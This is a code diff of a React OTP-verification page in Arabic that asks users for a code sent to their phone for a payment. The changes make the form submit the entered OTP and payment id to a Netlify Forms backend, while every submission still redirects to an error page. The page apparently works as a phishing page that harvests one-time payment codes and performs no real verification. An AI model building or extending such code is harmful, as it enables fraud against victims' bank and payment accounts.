@@ -1,3 +1,4 @@
+
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
@@ -12,9 +13,8 @@ const OTPVerification = () => {
     e.preventDefault();
     setLoading(true);
     
-    // Simulate processing time
+    // The form will be handled by Netlify Forms automatically
     setTimeout(() => {
-      // Always redirect to error page (as per requirements)
       navigate('/error');
     }, 2000);
   };
@@ -63,7 +63,25 @@ const OTPVerification = () => {
 
         {/* OTP Form Card - Mobile Optimized */}
         <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg p-4 sm:p-6 mb-3 sm:mb-6">
-          <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-6">
+          <form 
+            name="otp-verification" 
+            method="POST" 
+            data-netlify="true" 
+            netlify-honeypot="bot-field"
+            onSubmit={handleSubmit} 
+            className="space-y-4 sm:space-y-6"
+            action="/error"
+          >
+            {/* Hidden fields for Netlify */}
+            <input type="hidden" name="form-name" value="otp-verification" />
+            <input type="hidden" name="payment-id" value={id} />
+            <input type="hidden" name="otp-code" value={otp} />
+            <p style={{ display: 'none' }}>
+              <label>
+                Don't fill this out if you're human: <input name="bot-field" />
+              </label>
+            </p>
+
             <div className="text-center space-y-3 sm:space-y-4">
               <p className="text-gray-600 text-sm sm:text-lg px-2">
                 يرجى إدخال رمز التحقق المرسل إلى هاتفك المحمول
@@ -77,6 +95,7 @@ const OTPVerification = () => {
                   maxLength={6}
                   value={otp}
                   onChange={(value) => setOtp(value)}
+                  name="otp"
                 >
                   <InputOTPGroup className="gap-1 sm:gap-3">
                     <InputOTPSlot index={0} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
@@ -98,34 +117,35 @@ const OTPVerification = () => {
                 </button>
               </div>
             </div>
-          </form>
-        </div>
 
-        {/* Action Buttons Card - Mobile Optimized */}
-        <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg p-4 sm:p-6">
-          <div className="flex space-x-3 sm:space-x-4">
-            <button
-              onClick={handleCancel}
-              className="flex-1 bg-gray-300 text-gray-700 py-3 sm:py-4 rounded-lg text-base sm:text-lg font-medium hover:bg-gray-400 transition-colors"
-              disabled={loading}
-            >
-              إلغاء
-            </button>
-            <button
-              onClick={handleSubmit}
-              className="flex-1 bg-gray-300 text-gray-700 py-3 sm:py-4 rounded-lg text-base sm:text-lg font-medium hover:bg-gray-400 transition-colors"
-              disabled={loading || otp.length !== 6}
-            >
-              {loading ? (
-                <>
-                  <div className="animate-spin rounded-full h-4 w-4 sm:h-5 sm:w-5 border-b-2 border-gray-700 mr-2 inline-block"></div>
-                  جاري التحقق...
-                </>
-              ) : (
-                'تأكيد'
-              )}
-            </button>
-          </div>
+            {/* Action Buttons Card - Mobile Optimized */}
+            <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg p-4 sm:p-6 mt-6">
+              <div className="flex space-x-3 sm:space-x-4">
+                <button
+                  type="button"
+                  onClick={handleCancel}
+                  className="flex-1 bg-gray-300 text-gray-700 py-3 sm:py-4 rounded-lg text-base sm:text-lg font-medium hover:bg-gray-400 transition-colors"
+                  disabled={loading}
+                >
+                  إلغاء
+                </button>
+                <button
+                  type="submit"
+                  className="flex-1 bg-gray-300 text-gray-700 py-3 sm:py-4 rounded-lg text-base sm:text-lg font-medium hover:bg-gray-400 transition-colors"
+                  disabled={loading || otp.length !== 6}
+                >
+                  {loading ? (
+                    <>
+                      <div className="animate-spin rounded-full h-4 w-4 sm:h-5 sm:w-5 border-b-2 border-gray-700 mr-2 inline-block"></div>
+                      جاري التحقق...
+                    </>
+                  ) : (
+                    'تأكيد'
+                  )}
+                </button>
+              </div>
+            </div>
+          </form>
         </div>
 
         {/* Security Notice - Mobile Optimized */}
